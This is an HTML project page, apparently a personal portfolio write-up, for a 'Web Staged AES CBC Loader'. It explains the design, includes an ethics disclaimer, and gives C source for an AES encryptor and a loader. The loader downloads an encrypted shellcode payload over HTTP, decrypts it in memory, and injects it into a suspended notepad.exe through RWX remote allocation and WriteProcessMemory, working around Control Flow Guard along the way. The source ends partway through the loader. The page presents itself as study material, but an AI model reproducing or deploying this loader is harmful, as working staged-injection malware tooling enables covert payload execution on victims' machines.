@@ -1,0 +1,1022 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Web Staged AES CBC Loader | Bleu Strnad</title>
+<link rel="icon" href="favicon-32x32.png">
+<style>
+  :root {
+    --bg-main: #0000aa;
+    --bg-panel: rgba(255, 255, 255, 0.1);
+    --text-main: #ffffff;
+    --text-muted: #d9dcff;
+    --border: rgba(255, 255, 255, 0.35);
+    --max-width: 1100px;
+  }
+
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
+
+  html {
+    height: 100%;
+  }
+
+  body {
+    min-height: 100%;
+    font-family: "Lucida Console", monospace;
+    color: var(--text-main);
+    background: var(--bg-main);
+    line-height: 1.6;
+    overflow-x: hidden;
+    overflow-y: auto;
+    padding: 1.25rem 1rem calc(5.5rem + env(safe-area-inset-bottom));
+    position: relative;
+    isolation: isolate;
+  }
+
+  body::before {
+    content: "";
+    position: fixed;
+    inset: -30vmax;
+    z-index: -1;
+    pointer-events: none;
+    background:
+      radial-gradient(circle at 10% 10%, rgba(255, 255, 255, 0.14), rgba(255, 255, 255, 0) 45%),
+      radial-gradient(circle at 90% 80%, rgba(255, 255, 255, 0.11), rgba(255, 255, 255, 0) 42%),
+      var(--bg-main);
+    filter: blur(12px);
+    transform: translateZ(0);
+  }
+
+  .project-page {
+    max-width: var(--max-width);
+    margin: 0 auto;
+    display: grid;
+    gap: 1.5rem;
+  }
+
+  .panel {
+    background: var(--bg-panel);
+    border: 1px solid var(--border);
+    border-radius: 12px;
+    padding: 1.25rem;
+    overflow: hidden;
+    -webkit-backdrop-filter: blur(2px);
+    backdrop-filter: blur(2px);
+  }
+
+  .project-title {
+    font-size: clamp(2rem, 5vw, 3.8rem);
+    letter-spacing: 0.06em;
+    margin-bottom: 0.5rem;
+  }
+
+  .project-subtitle {
+    color: var(--text-muted);
+    font-size: clamp(1rem, 2.5vw, 1.25rem);
+  }
+
+  .content p + p {
+    margin-top: 1rem;
+  }
+
+  h2 {
+    margin-bottom: 0.75rem;
+  }
+
+  code {
+    color: #e0f0ff;
+    font-weight: 500;
+    letter-spacing: 0.02em;
+  }
+
+  .tech-list {
+    display: grid;
+    gap: 0.75rem;
+    margin-top: 1rem;
+  }
+
+  .tech-item {
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 0.9rem;
+    background: rgba(0, 0, 0, 0.18);
+  }
+
+  .tech-item strong {
+    display: block;
+    margin-bottom: 0.35rem;
+  }
+
+  .gallery-subtitle {
+    color: var(--text-muted);
+    margin-bottom: 0.9rem;
+    font-size: 0.95rem;
+  }
+
+  .gallery {
+    display: grid;
+    gap: 0.8rem;
+    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+  }
+
+  .gallery figure {
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    overflow: hidden;
+    background: rgba(0, 0, 0, 0.2);
+  }
+
+  .gallery img {
+    display: block;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    aspect-ratio: 16 / 10;
+    cursor: zoom-in;
+  }
+
+  .lightbox {
+    position: fixed;
+    inset: 0;
+    display: none;
+    align-items: center;
+    justify-content: center;
+    padding: 1rem;
+    background: rgba(0, 0, 0, 0.86);
+    z-index: 1000;
+  }
+
+  .lightbox.is-open {
+    display: flex;
+  }
+
+  .lightbox-content {
+    width: min(1100px, 100%);
+    max-height: 92vh;
+    position: relative;
+  }
+
+  .lightbox-content img {
+    width: 100%;
+    max-height: 92vh;
+    object-fit: contain;
+    border-radius: 10px;
+    border: 1px solid var(--border);
+    background: #0b0b2a;
+  }
+
+  .lightbox-close {
+    position: absolute;
+    top: 0.5rem;
+    right: 0.5rem;
+    border: 1px solid var(--text-main);
+    color: var(--text-main);
+    background: rgba(0, 0, 170, 0.65);
+    border-radius: 8px;
+    padding: 0.35rem 0.65rem;
+    cursor: pointer;
+    font: inherit;
+  }
+
+  .lightbox-close:hover,
+  .lightbox-close:focus-visible {
+    background: var(--text-main);
+    color: var(--bg-main);
+  }
+
+  .actions {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.75rem;
+  }
+
+  .button-link {
+    display: inline-block;
+    border: 1px solid var(--text-main);
+    color: var(--text-main);
+    text-decoration: none;
+    padding: 0.65rem 1rem;
+    border-radius: 8px;
+    transition: background-color 0.2s ease, color 0.2s ease;
+  }
+
+  .button-link:hover,
+  .button-link:focus-visible {
+    background: var(--text-main);
+    color: var(--bg-main);
+  }
+
+  .code-toggle {
+    margin-top: 0.85rem;
+    display: flex;
+    flex-direction: column;
+  }
+
+  .code-toggle-button {
+    display: inline-block;
+    border: 1px solid var(--text-main);
+    color: var(--text-main);
+    background: transparent;
+    text-decoration: none;
+    padding: 0.65rem 1rem;
+    border-radius: 8px;
+    transition: background-color 0.2s ease, color 0.2s ease;
+    font: inherit;
+    cursor: pointer;
+    order: 3;
+  }
+
+  .code-toggle-button:hover,
+  .code-toggle-button:focus-visible {
+    background: var(--text-main);
+    color: var(--bg-main);
+  }
+
+  .code-toggle pre {
+    margin: 0;
+    padding: 1.25rem;
+    overflow-x: auto;
+    background: rgba(0, 0, 20, 0.8);
+    border: 2px solid rgba(100, 180, 255, 0.6);
+    border-radius: 8px;
+    box-shadow: inset 0 2px 8px rgba(0, 0, 0, 0.5);
+  }
+
+  .code-toggle pre code {
+    color: #e0f0ff;
+    font-size: 0.95rem;
+    line-height: 1.5;
+  }
+
+  .code-toggle .code-full {
+    display: none;
+    order: 2;
+    margin-bottom: 0.8rem;
+  }
+
+  .code-toggle .code-preview {
+    order: 1;
+    margin-bottom: 0.8rem;
+  }
+
+  .code-toggle.is-open .code-preview {
+    display: none;
+  }
+
+  .code-toggle.is-open .code-full {
+    display: block;
+  }
+
+  @media (max-width: 640px) {
+    body {
+      padding: 1rem 0.85rem calc(6.5rem + env(safe-area-inset-bottom));
+    }
+
+    .panel {
+      padding: 1rem;
+      background: rgba(255, 255, 255, 0.14);
+      -webkit-backdrop-filter: none;
+      backdrop-filter: none;
+    }
+  }
+</style>
+</head>
+
+<body>
+<main class="project-page">
+  <header class="panel">
+    <h1 class="project-title">Web Staged AES Encrypted CBC-mode Loader</h1>
+    <p class="project-subtitle">Staged encrypted payload loader using WinINet, BCrypt, and Windows process injection | June 20th, 2026</p>
+  </header>
+
+  <section class="panel content" aria-labelledby="overview-heading">
+    <h2 id="overview-heading">Project Overview</h2>
+
+    <p>
+      I built this <strong>Web Staged AES CBC-mode Loader</strong> to better understand how payload staging, cryptography, and Windows process injection work at a lower level. The project has two main parts: an encryptor that takes a raw payload and protects it with AES-256-CBC, and a loader that downloads the encrypted file from a local web server, decrypts it in memory with the Windows Cryptography API, and runs it inside a suspended process.
+    </p>
+
+    <p>
+      The main reason I wanted to build this was because I kept seeing these ideas mentioned separately: AES encryption, staged payloads, shellcode loaders, suspended processes, and Control Flow Guard. Instead of just reading about them, I wanted to put the pieces together in C and actually see where things break. A lot of the project became less about simply getting code to run and more about understanding what Windows expects from handles, memory permissions, buffers, and process state.
+    </p>
+
+    <p>
+      The loader uses WinINet to retrieve the encrypted payload over HTTP, BCrypt to handle AES-CBC decryption, and Windows process APIs to create a suspended <code>notepad.exe</code> process before writing the decrypted payload into memory. I also added cleanup logic (eventually), error handling, and symbolic constants so the project was not just a messy proof of concept that worked once and then became impossible to debug.
+    </p>
+
+    <p>
+      Overall, this was a fun way to get more comfortable with Windows internals, cryptographic APIs, memory management, and the kind of burdensome low-level debugging that comes with writing C with Win32. It also helped me better understand how security features affect real execution instead of just reading about them in documentation.
+    </p>
+  </section>
+
+  <section class="panel content" aria-labelledby="build-heading">
+    <h2 id="build-heading">How It Works</h2>
+
+    <p>
+      The project starts with a small encryption utility. The encryptor reads a raw payload file, generates an initialization vector, encrypts the payload using AES-256-CBC, and writes the IV followed by the ciphertext into a new encrypted file (I used msfvenom to whip up a calc.bin shellcode). That encrypted file is then hosted locally on a python server (for testing purposes), so the loader can retrieve it during execution.
+    </p>
+
+    <p>
+      On the loader side, the program opens an internet handle, downloads the encrypted file in chunks, validates that the file is large enough to contain an IV, and then passes the encrypted section into BCrypt. I used a two-pass decryption flow because BCrypt first needs to calculate the required plaintext buffer size before actually writing the decrypted output.
+    </p>
+
+    <p>
+      Once the payload is decrypted, the loader starts <code>notepad.exe</code> in a suspended state. This gives the program a clean target process before normal execution begins. From there, the loader allocates memory in the remote process, writes the decrypted payload into that region, flushes the instruction cache, and creates a remote thread to begin execution.
+    </p>
+  </section>
+
+  <section class="panel content" aria-labelledby="cfg-heading">
+    <h2 id="cfg-heading">Control Flow Guard Challenge</h2>
+
+    <p>
+      One of the more interesting problems I ran into involved <strong>Control Flow Guard</strong>, or CFG. CFG is a Windows security feature that helps stop a program from jumping to unexpected memory locations. That becomes relevant when writing a loader because injected memory is not automatically treated as a valid place for execution.
+    </p>
+
+    <p>
+      Early versions of the project were inconsistent because the injected region could fail when the target process did not consider the address a valid call target. I found myself stuck for a couple of hours with an issue where notepad would crash immediately upon running the loader. I researched the issue and added logic to resolve <code>SetProcessValidCallTargets</code> from <code>kernel32.dll</code>, then attempt to register the injected address as valid before creating the remote thread.
+    </p>
+
+    <p>
+      This was not really a “bypass” as much as learning how to work with a modern Windows mitigation instead of pretending it does not exist. Debugging this part gave me a much better understanding of why older process injection examples can behave differently on newer versions of Windows.
+    </p>
+  </section>
+
+  <section class="panel content" aria-labelledby="tech-heading">
+    <h2 id="tech-heading">Technical Pieces</h2>
+
+    <div class="tech-list">
+      <div class="tech-item">
+        <strong>Payload Delivery</strong>
+        <p>
+          The loader uses WinINet to download the encrypted payload from a local HTTP server. The file is streamed in chunks instead of assuming a fixed size.
+        </p>
+      </div>
+
+      <div class="tech-item">
+        <strong>AES-CBC Decryption</strong>
+        <p>
+          The encrypted payload is decrypted with the Windows BCrypt API using AES-256-CBC. The first 16 bytes of the staged file are treated as the IV.
+        </p>
+      </div>
+
+      <div class="tech-item">
+        <strong>Suspended Process Creation</strong>
+        <p>
+          The target process is created in a suspended state so memory can be prepared before the process continues normal execution.
+        </p>
+      </div>
+
+      <div class="tech-item">
+        <strong>Remote Memory Operations</strong>
+        <p>
+          The project uses Windows memory and process APIs to allocate memory in the target process, write the decrypted payload, and prepare it for execution.
+        </p>
+      </div>
+
+      <div class="tech-item">
+        <strong>Resource Cleanup</strong>
+        <p>
+          I added a centralized cleanup function to close handles, free memory, destroy cryptographic keys, and avoid leaving behind broken processes when an error occurs.
+        </p>
+      </div>
+    </div>
+  </section>
+
+  <section class="panel content" aria-labelledby="lessons-heading">
+    <h2 id="lessons-heading">What I Learned</h2>
+
+    <p>
+      This project made me a lot more comfortable reading Microsoft documentation and figuring out why a Windows API call fails. A lot of the issues were not obvious at first because the program would compile fine, but then fail because of a bad buffer size, wrong memory permission, missing cleanup path, or incorrect assumption about how an API behaved.
+    </p>
+
+    <p>
+      I also learned how important it is to write C code that can actually be debugged. The first version had too many repeated cleanup paths and random constants scattered around the file. Cleaning it up with named constants, better error messages, and a single cleanup function (for the loader at least) made the project much easier to reason about.
+    </p>
+
+    <p>
+      The biggest takeaway was that low-level Windows development is not just about calling the right APIs. It is about understanding the state of the process, the memory, the handles, and the security features around the code. This was the first project where Control Flow Guard caused some serious issues. Getting this project working helped connect a lot of separate cybersecurity concepts into one full workflow.
+    </p>
+  </section>
+
+  <section class="panel content" aria-labelledby="ethics-heading">
+    <h2 id="ethics-heading">Ethics & Scope</h2>
+
+    <p>
+      This project was built strictly for educational and authorized lab use. I used it to study Windows internals, malware development, cryptography, process behavior, and defensive security concepts in a controlled environment.
+    </p>
+
+    <p>
+      Tools like this can be abused if used against systems without permission, so I treat this project as a learning exercise rather than a deployable tool. I do not condone or encourage the use of any malware against systems without explicit authorization. Any use of this project for unauthorized access, fraud, extortion, disruption of services, or other illegal activity is strictly prohibited, and frankly, not punk rock nor metal.
+    </p>
+
+        
+    </code></pre>
+  </section>
+
+  <section class="panel content" aria-labelledby="loader-heading">
+    <h2 id="loader-heading">encrypt.c</h2>
+
+    <div class="code-toggle">
+      <pre class="code-preview"><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;Windows.h&gt;
+#include &lt;bcrypt.h&gt;
+#include &lt;ntstatus.h&gt;
+#pragma comment(lib, "bcrypt.lib")
+
+int main(void)
+{
+    HANDLE hFile = INVALID_HANDLE_VALUE;
+    DWORD fileSize = 0;
+    DWORD bytesRead = 0;
+    PBYTE pShellcode = NULL;
+    PBYTE pCiphertext = NULL;
+
+    // open the shellcode bin
+    hFile = CreateFileA("calc.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+      printf("(!) failed to open shellcode bin\\n");
+      return 1;
+    }
+
+    fileSize = GetFileSize(hFile, NULL);
+    if (fileSize == INVALID_FILE_SIZE)
+    {
+      printf("(!) failed to get file size\\n");
+      CloseHandle(hFile);
+      return 1;
+    }
+
+    /* preview truncated */
+      </code></pre>
+      <button class="code-toggle-button" type="button" aria-expanded="false">See more</button>
+      <pre class="code-full"><code class="language-c">#include &lt;stdio.h&gt;
+#include &lt;Windows.h&gt;
+#include &lt;bcrypt.h&gt;
+#include &lt;ntstatus.h&gt;
+#pragma comment(lib, "bcrypt.lib")
+
+int main(void)
+{
+    HANDLE hFile = INVALID_HANDLE_VALUE;
+    DWORD fileSize = 0;
+    DWORD bytesRead = 0;
+    PBYTE pShellcode = NULL;
+    PBYTE pCiphertext = NULL;
+
+    // open the shellcode bin
+    hFile = CreateFileA("calc.bin", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hFile == INVALID_HANDLE_VALUE)
+    {
+        printf("(!) failed to open shellcode bin\n");
+        return 1;
+    }
+
+    fileSize = GetFileSize(hFile, NULL);
+    if (fileSize == INVALID_FILE_SIZE)
+    {
+        printf("(!) failed to get file size\n");
+        CloseHandle(hFile);
+        return 1;
+    }
+
+    pShellcode = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, fileSize);
+    if (!pShellcode)
+    {
+        printf("(!) failed to allocate memory\n");
+        CloseHandle(hFile);
+        return 1;
+    }
+
+    // read bin file into buffer
+    if (!ReadFile(hFile, pShellcode, fileSize, &bytesRead, NULL) || bytesRead != fileSize)
+    {
+        printf("(!) failed to read file\n");
+        CloseHandle(hFile);
+        HeapFree(GetProcessHeap(), 0, pShellcode);
+        return 1;
+    }
+
+    printf("shellcode read successfully, size: %d bytes\n", fileSize);
+
+    // open aes algorithm
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    NTSTATUS status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
+    if (status < 0)   
+    {
+        printf("(!) failed to open algorithm provider\n");
+        HeapFree(GetProcessHeap(), 0, pShellcode);
+        CloseHandle(hFile);
+        return 1;
+    }
+
+    // set cbc mode
+    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+    if (status < 0)
+    {
+        printf("(!) failed to set chaining mode\n");
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        HeapFree(GetProcessHeap(), 0, pShellcode);
+        CloseHandle(hFile);
+        return 1;
+    }
+
+    BYTE key[32] = {
+        0x9f, 0x2e, 0x7c, 0x4b, 0xa1, 0xd5, 0x68, 0x3f,
+        0xe6, 0x12, 0x9c, 0x75, 0x4d, 0xb8, 0x03, 0xe1,
+        0x2a, 0x6f, 0x9d, 0x14, 0x8b, 0xc7, 0x5e, 0x30,
+        0xf4, 0x81, 0x26, 0x5a, 0xd9, 0x7b, 0xc0, 0x18
+    }; // 32 bytes for AES-256
+    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, sizeof(key), 0);
+    if (status < 0)
+    {
+        printf("(!) failed to generate symmetric key\n");
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        HeapFree(GetProcessHeap(), 0, pShellcode);
+        CloseHandle(hFile);
+        return 1;
+    }
+
+    BYTE iv[16] = { 0 };
+    status = BCryptGenRandom(NULL, iv, sizeof(iv), BCRYPT_USE_SYSTEM_PREFERRED_RNG);
+    if (status < 0)
+    {
+        printf("(!) failed to generate IV\n");
+        BCryptDestroyKey(hKey);
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        HeapFree(GetProcessHeap(), 0, pShellcode);
+        CloseHandle(hFile);
+        return 1;
+    }
+
+    printf("(+) IV generated successfully\n");
+
+    ULONG ciphertextSize = 0;
+    ULONG resultSize = 0;
+
+    // calculate required buffer size for ciphertext
+    status = BCryptEncrypt(hKey, pShellcode, fileSize, NULL, iv, sizeof(iv), NULL, 0, &ciphertextSize, BCRYPT_BLOCK_PADDING);
+    if (status < 0)
+    {
+        printf("(!) failed to calculate ciphertext size\n");
+        BCryptDestroyKey(hKey);
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        HeapFree(GetProcessHeap(), 0, pShellcode);
+        CloseHandle(hFile);
+        return 1;
+    }
+
+    pCiphertext = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, ciphertextSize);
+    if (!pCiphertext)
+    {
+        printf("(!) failed to allocate memory for ciphertext\n");
+        BCryptDestroyKey(hKey);
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        HeapFree(GetProcessHeap(), 0, pShellcode);
+        CloseHandle(hFile);
+        return 1;
+    }
+
+    // encrypt
+    status = BCryptEncrypt(hKey, pShellcode, fileSize, NULL, iv, sizeof(iv), pCiphertext, ciphertextSize, &resultSize, BCRYPT_BLOCK_PADDING);
+    if (status < 0)
+    {
+        printf("(!) failed to encrypt data\n");
+        HeapFree(GetProcessHeap(), 0, pCiphertext);
+        BCryptDestroyKey(hKey);
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        HeapFree(GetProcessHeap(), 0, pShellcode);
+        CloseHandle(hFile);
+        return 1;
+    }
+
+    printf("(+) encryption successful, ciphertext size: %d bytes\n", resultSize);
+
+    // write iv + ciphertext to file
+    HANDLE hOutFile = CreateFileA("calc.bin.enc", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hOutFile != INVALID_HANDLE_VALUE)
+    {
+        DWORD bytesWritten = 0;
+        WriteFile(hOutFile, iv, sizeof(iv), &bytesWritten, NULL);
+        WriteFile(hOutFile, pCiphertext, resultSize, &bytesWritten, NULL);
+        CloseHandle(hOutFile);
+        printf("(+) encrypted data written to calc.bin.enc\n");
+    }
+    else printf("(!) failed to create output file\n");
+
+    // cleanup
+    HeapFree(GetProcessHeap(), 0, pCiphertext);
+    BCryptDestroyKey(hKey);
+    BCryptCloseAlgorithmProvider(hAlg, 0);
+    HeapFree(GetProcessHeap(), 0, pShellcode);
+    CloseHandle(hFile);
+
+    return 0;
+}
+      </code></pre>
+    </div>
+  </section>
+  </section>
+
+  <section class="panel content" aria-labelledby="loader-heading">
+    <h2 id="loader-heading">loader.c</h2>
+
+    <div class="code-toggle">
+      <pre class="code-preview"><code class="language-c">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;bcrypt.h&gt;
+#include &lt;wininet.h&gt;
+#include &lt;Tlhelp32.h&gt;
+#pragma comment(lib, "bcrypt.lib")
+#pragma comment(lib, "wininet.lib")
+
+  typedef BOOL(WINAPI* fnSetProcessValidCallTargets)(
+    HANDLE hProcess,
+    PVOID VirtualAddress,
+    SIZE_T RegionSize,
+    ULONG NumberOfOffsets,
+    PCFG_CALL_TARGET_INFO OffsetInformation);
+
+#define PAYLOAD_KEY_SIZE 32
+#define PAYLOAD_IV_SIZE 16
+#define TEMP_BUFFER_SIZE 4096
+
+  // cleanup function to reduce code duplication
+  void CleanupResources(
+    HINTERNET hInternet,
+    HINTERNET hUrl,
+    PBYTE pPayload,
+    PBYTE pPlainText,
+    BCRYPT_KEY_HANDLE hKey,
+    BCRYPT_ALG_HANDLE hAlg,
+    HANDLE hProc,
+    HANDLE hMainThread,
+    HANDLE hThread,
+    BOOL bTerminateProcess)
+  {
+    if (hThread) CloseHandle(hThread);
+    if (hMainThread) {
+      if (bTerminateProcess && hProc) TerminateProcess(hProc, 0);
+      CloseHandle(hMainThread);
+    }
+    if (hProc) CloseHandle(hProc);
+    if (pPlainText) HeapFree(GetProcessHeap(), 0, pPlainText);
+    if (hKey) BCryptDestroyKey(hKey);
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    if (pPayload) HeapFree(GetProcessHeap(), 0, pPayload);
+    if (hUrl) InternetCloseHandle(hUrl);
+    if (hInternet) InternetCloseHandle(hInternet);
+  }
+
+  /* preview truncated */
+      </code></pre>
+      <button class="code-toggle-button" type="button" aria-expanded="false">See more</button>
+      <pre class="code-full"><code class="language-c">#include &lt;Windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;bcrypt.h&gt;
+#include &lt;wininet.h&gt;
+#include &lt;Tlhelp32.h&gt;
+#pragma comment(lib, "bcrypt.lib")
+#pragma comment(lib, "wininet.lib")
+
+
+typedef BOOL(WINAPI* fnSetProcessValidCallTargets)(
+    HANDLE hProcess,
+    PVOID VirtualAddress,
+    SIZE_T RegionSize,
+    ULONG NumberOfOffsets,
+    PCFG_CALL_TARGET_INFO OffsetInformation);
+
+#define PAYLOAD_KEY_SIZE 32
+#define PAYLOAD_IV_SIZE 16
+#define TEMP_BUFFER_SIZE 4096
+#define MIN_PAYLOAD_SIZE 16
+
+// cleanup function to reduce code duplication
+void CleanupResources(
+    HINTERNET hInternet,
+    HINTERNET hUrl,
+    PBYTE pPayload,
+    PBYTE pPlainText,
+    BCRYPT_KEY_HANDLE hKey,
+    BCRYPT_ALG_HANDLE hAlg,
+    HANDLE hProc,
+    HANDLE hMainThread,
+    HANDLE hThread,
+    BOOL bTerminateProcess)
+{
+    if (hThread) CloseHandle(hThread);
+    if (hMainThread) {
+        if (bTerminateProcess && hProc) TerminateProcess(hProc, 0);
+        CloseHandle(hMainThread);
+    }
+    if (hProc) CloseHandle(hProc);
+    if (pPlainText) HeapFree(GetProcessHeap(), 0, pPlainText);
+    if (hKey) BCryptDestroyKey(hKey);
+    if (hAlg) BCryptCloseAlgorithmProvider(hAlg, 0);
+    if (pPayload) HeapFree(GetProcessHeap(), 0, pPayload);
+    if (hUrl) InternetCloseHandle(hUrl);
+    if (hInternet) InternetCloseHandle(hInternet);
+}
+
+int main(void)
+{
+    HINTERNET hInternet = NULL;
+    HINTERNET hUrl = NULL;
+    PBYTE pPayload = NULL;
+    PBYTE pPlainText = NULL;
+    DWORD dwTotalSize = 0;
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    HANDLE hProc = NULL;
+    HANDLE hThread = NULL;
+    HANDLE hMainThread = NULL;
+    PROCESS_INFORMATION pi = { 0 };
+    NTSTATUS status = 0;
+
+    hInternet = InternetOpenW(L"WebStagedAESCBCLoader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
+    if (!hInternet)
+    {
+        printf("(!) InternetOpenW failed\n");
+        return 1;
+    }
+
+    hUrl = InternetOpenUrlW(hInternet, L"http://localhost:8000/calc.bin.enc", NULL, 0,
+                            INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
+    if (!hUrl) {
+        printf("(!) InternetOpenUrlW failed\n");
+        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
+        return 1;
+    }
+
+    // download encrypted payload (using local python server for testing)
+    BYTE tempBuffer[TEMP_BUFFER_SIZE];
+    DWORD dwChunkSize = 0;
+
+    while (InternetReadFile(hUrl, tempBuffer, sizeof(tempBuffer), &dwChunkSize)) {
+        if (dwChunkSize == 0) break;
+
+        PBYTE pNew = (pPayload == NULL) ?
+            (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwChunkSize) :
+            (PBYTE)HeapReAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, pPayload, dwTotalSize + dwChunkSize);
+
+        if (!pNew) {
+            CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
+            return 1;
+        }
+
+        pPayload = pNew;
+        memcpy(pPayload + dwTotalSize, tempBuffer, dwChunkSize);
+        dwTotalSize += dwChunkSize;
+    }
+
+    if (dwTotalSize < MIN_PAYLOAD_SIZE) {
+        printf("(!) payload too small\n");
+        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
+        return 1;
+    }
+
+    // initialize AES-CBC decryption
+    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
+    if (status < 0) {
+        printf("(!) BCryptOpenAlgorithmProvider failed\n");
+        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
+        return 1;
+    }
+
+    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, (PUCHAR)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
+    if (status < 0) {
+        printf("(!) BCryptSetProperty failed\n");
+        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
+        return 1;
+    }
+
+    BYTE key[PAYLOAD_KEY_SIZE] = {
+        0x9f,0x2e,0x7c,0x4b,0xa1,0xd5,0x68,0x3f,0xe6,0x12,0x9c,0x75,0x4d,0xb8,0x03,0xe1,
+        0x2a,0x6f,0x9d,0x14,0x8b,0xc7,0x5e,0x30,0xf4,0x81,0x26,0x5a,0xd9,0x7b,0xc0,0x18
+    };
+    status = BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, key, sizeof(key), 0);
+    if (status < 0) {
+        printf("(!) BCryptGenerateSymmetricKey failed\n");
+        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
+        return 1;
+    }
+
+    BYTE iv[PAYLOAD_IV_SIZE];
+    memcpy(iv, pPayload, PAYLOAD_IV_SIZE);
+
+    ULONG psize = 0, rsize = 0;
+
+    // query required plaintext size
+    status = BCryptDecrypt(hKey, pPayload + PAYLOAD_IV_SIZE, dwTotalSize - PAYLOAD_IV_SIZE, NULL, iv, PAYLOAD_IV_SIZE, NULL, 0, &psize, BCRYPT_BLOCK_PADDING);
+    if (status < 0) {
+        printf("(!) BCryptDecrypt (size query) failed\n");
+        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
+        return 1;
+    }
+
+    pPlainText = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, psize);
+    if (!pPlainText) {
+        printf("(!) HeapAlloc failed\n");
+        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
+        return 1;
+    }
+
+    // re-copy IV - BCryptDecrypt updates the IV buffer in CBC mode
+    memcpy(iv, pPayload, PAYLOAD_IV_SIZE);
+
+    status = BCryptDecrypt(hKey, pPayload + PAYLOAD_IV_SIZE, dwTotalSize - PAYLOAD_IV_SIZE, NULL, iv, PAYLOAD_IV_SIZE, pPlainText, psize, &rsize, BCRYPT_BLOCK_PADDING);
+    if (status < 0) {
+        printf("(!) BCryptDecrypt failed\n");
+        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
+        return 1;
+    }
+
+    printf("(+) decrypted %lu bytes\n", rsize);
+    if (rsize == 0) {
+        printf("(!) decryption produced 0 bytes\n");
+        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
+        return 1;
+    }
+
+    // spawn suspended target process
+    STARTUPINFOW si = { 0 };
+    si.cb = sizeof(si);
+
+    if (!CreateProcessW(L"C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,
+                        CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
+        printf("(!) CreateProcessW(notepad.exe) failed. E\error=%lu\n", GetLastError());
+        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, FALSE);
+        return 1;
+    }
+
+    hProc = pi.hProcess;
+    hMainThread = pi.hThread;
+    printf("(+) spawned suspended notepad.exe PID: %lu\n", pi.dwProcessId);
+
+    // remote code injection
+    LPVOID pRemote = VirtualAllocEx(hProc, NULL, rsize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (!pRemote) {
+        printf("(!) VirtualAllocEx failed. Error=%lu\n", GetLastError());
+        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, TRUE);
+        return 1;
+    }
+
+    SIZE_T written = 0;
+    if (!WriteProcessMemory(hProc, pRemote, pPlainText, rsize, &written) || written != rsize) {
+        printf("(!) WriteProcessMemory failed. Error=%lu\n", GetLastError());
+        CleanupResources(hInternet, hUrl, pPayload, pPlainText, hKey, hAlg, hProc, hMainThread, hThread, TRUE);
+        return 1;
+    }
+
+    if (!FlushInstructionCache(hProc, pRemote, rsize)) {
+        printf("(!) FlushInstructionCache failed. Error=%lu\n", GetLastError());
